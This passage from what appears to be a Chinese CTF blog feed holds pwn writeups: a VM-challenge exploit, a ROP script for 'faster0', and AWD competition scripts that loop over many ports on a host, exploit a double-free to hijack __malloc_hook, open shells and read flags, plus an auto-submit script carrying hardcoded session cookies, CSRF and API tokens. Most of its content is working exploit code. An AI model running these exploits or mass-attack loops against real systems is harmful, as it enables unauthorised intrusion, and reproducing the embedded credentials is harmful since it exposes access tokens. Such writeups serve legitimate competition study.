<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> imm: temp = ebp_now + imm</span><br><span class="line"><span class="number">1</span> imm: temp = imm;</span><br><span class="line"><span class="number">6</span> imm: push ebp_now; ebp_now = esp_now; esp_now -= imm;</span><br><span class="line"><span class="number">8</span> : leave; ret;</span><br><span class="line"><span class="number">9</span> : temp = *(qword*)temp </span><br><span class="line"><span class="number">10</span> : temp = *(<span class="keyword">char</span>*)temp</span><br><span class="line"><span class="number">11</span> : **esp_now = temp; ++esp_now;   <span class="number">8b</span>yte</span><br><span class="line"><span class="number">12</span> : **esp_now = temp; ++esp_now;   <span class="number">1b</span>yte</span><br><span class="line"><span class="number">13</span> : push temp</span><br><span class="line"><span class="number">14</span> : temp |= *esp now; pop;</span><br><span class="line"><span class="number">15</span> : temp ^= *esp now; pop;</span><br><span class="line"><span class="number">16</span> : temp &amp;= *esp now; pop;</span><br><span class="line"><span class="number">17</span> : temp = temp == *esp now; pop;</span><br><span class="line"><span class="number">18</span> :       != </span><br><span class="line"><span class="number">19</span> :        &lt;</span><br><span class="line"><span class="number">20</span> :        &gt;</span><br><span class="line"><span class="number">21</span> :        &lt;=</span><br><span class="line"><span class="number">22</span> :        &gt;=</span><br><span class="line"><span class="number">23</span> :        &lt;&lt;</span><br><span class="line"><span class="number">24</span> :        &gt;&gt;</span><br><span class="line"><span class="number">25</span> :         +</span><br><span class="line"><span class="number">26</span> :  temp = *esp_now - temp;</span><br><span class="line"><span class="number">27</span> :         *</span><br><span class="line"><span class="number">28</span> :          /</span><br><span class="line"><span class="number">29</span> :         %</span><br><span class="line"><span class="number">30</span> :  <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-解题思路"><a href="#2-2-解题思路" class="headerlink" title="2.2 解题思路"></a>2.2 解题思路</h3><ol>
<li>先用14指令pop一下，这个时候temp中存的就是真实的栈指针了</li>
<li>再利用1指令和26计算出返回地址的位置，13来把计算结果存到栈上</li>
<li>用9指令获取返回地址里的内容（libc_start_main+231)，然后再用13保存到栈上</li>
<li>利用1和26计算libc基址，然后再用13保存到栈上</li>
<li>利用1和25计算onegadget的偏移</li>
<li>最后利用11把onegadget写入返回地址</li>
</ol>
<h3 id="2-3-exp"><a href="#2-3-exp" class="headerlink" title="2.3 exp"></a>2.3 exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">libc231=<span class="number">0x7f9848c0cb97</span><span class="number">-0x7f9848beb000</span></span><br><span class="line">onegadget=<span class="number">0x4f2c5</span></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">14</span>)  <span class="comment">#步骤1</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0xe8</span>)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤2</span></span><br><span class="line">payload+=p64(<span class="number">9</span>)+p64(<span class="number">13</span>)   <span class="comment">#步骤3</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(libc231)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤4</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(onegadget)+p64(<span class="number">25</span>) <span class="comment">#步骤5</span></span><br><span class="line">payload+=p64(<span class="number">11</span>) <span class="comment">#步骤6</span></span><br><span class="line">p.send(payload) <span class="comment">#步骤7</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="0x3-faster0"><a href="#0x3-faster0" class="headerlink" title="0x3 faster0"></a>0x3 faster0</h2><p>这个题，乍一看要做一百次选择，然后最后进入func100，有一个很简单的栈溢出，最笨的方法就是一个一个把100个都过了，也可以。但感觉会有更简单的方法，比如是不是能让atoi返回大于10的数，然后一直走func000，然后再直接跳到func095,不过自己没有实现。放一个学弟写的脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">sh = process(<span class="string">'./faster0'</span>)</span><br><span class="line">num = <span class="string">'''</span></span><br><span class="line"><span class="string">4 9 4 9 6 0 3 4 1 6</span></span><br><span class="line"><span class="string">5 9 1 9 3 2 2 2 0 0</span></span><br><span class="line"><span class="string">9 6 9 9 1 4 8 9 4 6</span></span><br><span class="line"><span class="string">1 5 7 5 0 3 5 6 5 8</span></span><br><span class="line"><span class="string">3 6 2 6 5 5 7 3 2 8</span></span><br><span class="line"><span class="string">4 4 4 7 7 5 2 1 6 7</span></span><br><span class="line"><span class="string">0 3 4 8 6 0 0 3 1 1</span></span><br><span class="line"><span class="string">0 7 8 2 7 1 9 5 6 9</span></span><br><span class="line"><span class="string">9 3 4 7 7 5 3 7 2 3</span></span><br><span class="line"><span class="string">8 7 2 5 2 2 6 6 6 3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000406013</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">write_plt = <span class="number">0x400640</span></span><br><span class="line">start_addr = <span class="number">0x4006c0</span></span><br><span class="line">num = num.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">num = num.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">sh.sendline(num)</span><br><span class="line">sh.recvuntil(<span class="string">'WOW,U R GREAT !\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0xd8</span> + p64(rdi_ret) + p64(<span class="number">1</span>) + p64(rsi_r15_ret) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt) + p64()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>vm</tag>
      </tags>
  </entry>
  <entry>
    <title>awd 通打pwn脚本记录一波</title>
    <url>/year/04/26/cl7iordp9001y293fym7f3xa8/</url>
    <content><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>第一次线上awd，交flag是交的真的爽，也算是对awd的流程有所熟悉了。题目不难，但是深感自己写脚本速度还是不够快。</p>
<a id="more"></a>

<h2 id="0x1-第一题"><a href="#0x1-第一题" class="headerlink" title="0x1 第一题"></a>0x1 第一题</h2><p>double_free,然后改就是把free函数给弄没了。。。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"39.100.119.37"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line">	sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">	malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">	fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">	sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">	sh.sendline(str(<span class="number">1</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = get_shell(ip, port)</span><br><span class="line">		r.sendline(<span class="string">"cat flag\n"</span>)</span><br><span class="line">		<span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">		r.close()</span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line">port = <span class="number">41080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	get_flag(ip, port + i * <span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x2-第二题"><a href="#0x2-第二题" class="headerlink" title="0x2 第二题"></a>0x2 第二题</h2><p>还是个double_free,同样把free给改没了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'5'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'index&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    content = sh.recv(<span class="number">6</span>)</span><br><span class="line">   <span class="comment"># log.info(content)</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">30</span>):</span><br><span class="line">	ips.append(<span class="string">"4"</span> + str(i + <span class="number">2</span>).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	</span><br><span class="line">	sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line">	sh.recvuntil(<span class="string">'Your Choice\n'</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">	add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#1</span></span><br><span class="line">	add(<span class="number">9</span>,<span class="number">0x30</span>,<span class="string">'ss'</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">	one_gadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">	malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line">	fake_fast = malloc_hook - <span class="number">0x13</span></span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">	add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	add(<span class="number">4</span>,<span class="number">0x60</span>,p64(fake_fast))</span><br><span class="line">	add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">'z'</span>)</span><br><span class="line">	add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">'ss'</span>)</span><br><span class="line">	add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">'a'</span> * <span class="number">0x3</span> + p64(one_gadget))</span><br><span class="line">	sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">	sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		sh = get_shell(ip)</span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line">		sh.sendline(<span class="string">'cat ?l?g'</span>)</span><br><span class="line">		sleep(<span class="number">0.5</span>)</span><br><span class="line">		sh.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">		flag = sh.recvall(timeout= <span class="number">1</span>)</span><br><span class="line">		log.success(flag)</span><br><span class="line">		sh.close()</span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">	<span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line">	<span class="comment"># 	continue</span></span><br><span class="line"></span><br><span class="line">	get_flag(ip)</span><br></pre></td></tr></table></figure>

<h2 id="自动提交脚本"><a href="#自动提交脚本" class="headerlink" title="自动提交脚本"></a>自动提交脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tjflag1</span><span class="params">(flag)</span>:</span></span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://39.100.119.37:8080/api/v1/challenges/attempt"</span></span><br><span class="line">    <span class="comment">#data=&#123;"challenge_id":2,"submission":""+flag+""&#125;</span></span><br><span class="line">    data=<span class="string">'&#123;"challenge_id":2,"submission":"'</span>+flag+<span class="string">'"&#125;'</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"CSRF-Token"</span>:<span class="string">"e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a"</span>,</span><br><span class="line"><span class="string">"Connection"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">"session"</span>:<span class="string">"2deefa03-cda6-41fc-be25-a986067c7048"</span>,<span class="string">"PHPSESSID"</span>:<span class="string">"jnr3quolg5o2ohlifbdld6bku5"</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftjflag1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./web2.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            print(a.strip())</span><br><span class="line">            tjflag1(a.strip())</span><br><span class="line">ftjflag1()</span><br></pre></td></tr></table></figure>

<h3 id="整理flag的正则"><a href="#整理flag的正则" class="headerlink" title="整理flag的正则"></a>整理flag的正则</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag=re.findall(r&apos;flag&#123;[a-zA-Z0-9\-]*&#125;&apos;, data)[0]</span><br><span class="line">            flag_file.write(flag+&quot;\n&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="0x3-第二次awd-pwn1脚本"><a href="#0x3-第二次awd-pwn1脚本" class="headerlink" title="0x3 第二次awd pwn1脚本"></a>0x3 第二次awd pwn1脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">token = <span class="string">"7hQvn3AnHrtjaFmFN2MxztbCM4hGRQECZKEvJzu2dtSfU"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ips=[]</span><br><span class="line"></span><br><span class="line">context.timeout = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"How long is your secret?\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"So,tell me your secret:\n"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">'Which secret do you want to drop off?'</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fo = open(<span class="string">"foo.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">28</span>):</span><br><span class="line"></span><br><span class="line">	ips.append(<span class="string">"1"</span> + str(i).rjust(<span class="number">2</span>,<span class="string">'0'</span>) + <span class="string">"80"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print ips</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line"></span><br><span class="line">	sh = remote(<span class="string">'39.100.119.37'</span>, int(ip,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#sh = process('./pwn')</span></span><br><span class="line"></span><br><span class="line">	sh.send(<span class="string">'iwanaflag'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> sh.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">'\x00'</span> * <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">	sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">'4. exit'</span>)</span><br><span class="line"></span><br><span class="line">	sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">'Here is shell box!\n'</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">'ls\x00,/bin/sh'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sh.send(payload)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(ip)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">		sh = get_shell(ip)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		sh.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.sendline('cat flag')</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#sh.interactive()</span></span><br><span class="line"></span><br><span class="line">		flag = sh.recvall(timeout=<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">		fo.write(flag)</span><br><span class="line"></span><br><span class="line">		sh.close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'KeyError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'IndexError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'TypeError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'ValueError'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">		print(<span class="string">'Exception'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"></span><br><span class="line">	<span class="comment"># if ip[7:9] == "16" or ip[7:9] == "17" or ip[7:8] == "8" or ip[7:8] == "6":</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 	continue</span></span><br><span class="line"></span><br><span class="line">	get_flag(ip)</span><br></pre></td></tr></table></figure>

<p>python经常碰到一些缩进问题的报错，很烦人</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>largebin_attack</title>
    <url>/year/04/11/cl7iordpe002c293fciminnbf/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>largebin attack 以前就是稍微看过，没怎么做过题，这里总结下largebin的管理机制,然后做一两道题练手然后就开始深入内核pwn的学习了。感觉自己刷题还是不够，等以赛代练吧。</p>
<a id="more"></a>

